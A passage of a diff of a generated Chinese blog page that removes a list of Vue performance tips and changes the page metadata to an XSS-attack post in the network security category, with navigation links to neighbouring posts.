-<li>合理使用组件，提高代码可维护性的同事也会降低代码组件的耦合性</li>
-<li>使用路由懒加载，在需要的时候才会进行加载，避免一次性加载太多路由，导致页面阻塞</li>
-<li>使用 Vuex 缓存数据</li>
-<li>合理使用 mixins，抽离公共代码封装成模块，避免重复代码。</li>
-<li>合理使用 v-if 、v-show</li>
-<li>v-for 不要和 v-if 一起使用，v-for 的优先级会比 v-if 高</li>
-<li>v-for 中不要用 index 做 key，要保证 key 的唯一性</li>
-<li>使用异步组件，避免一次性加载太多组件</li>
-<li>避免使用 v-html，存在安全问风险和性能问题，可以使用 v-text</li>
-<li>使用 keep-alive 缓存组件，避免组件重复加载</li>
-</ul>
-</li>
-</ul>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6911472693405548557#heading-5">调试工具</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6911472693405548557#heading-16">监控工具</a></li>
 </ul>
 
                 
@@ -605,7 +575,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" class="category-chain-item">性能优化</a>
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
   
   
 
@@ -620,7 +590,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" class="print-no-link">#性能优化</a>
+        <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" class="print-no-link">#浏览器</a>
+      
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
       
     </div>
   
@@ -632,8 +604,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>性能优化</div>
-      <div>https://xuekeven.github.io/2025/08/07/性能优化/</div>
+      <div>XSS攻击</div>
+      <div>https://xuekeven.github.io/2025/08/07/XSS攻击/</div>
     </div>
     <div class="license-meta">
       
@@ -682,12 +654,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2025/08/11/CSRF%E6%94%BB%E5%87%BB/" title="CSRF攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSRF攻击</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/08/07/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" title="浏览器安全">
-                        <span class="hidden-mobile">浏览器安全</span>
+                      <a href="/2025/08/02/CSS%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1/" title="CSS模块化">
+                        <span class="hidden-mobile">CSS模块化</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
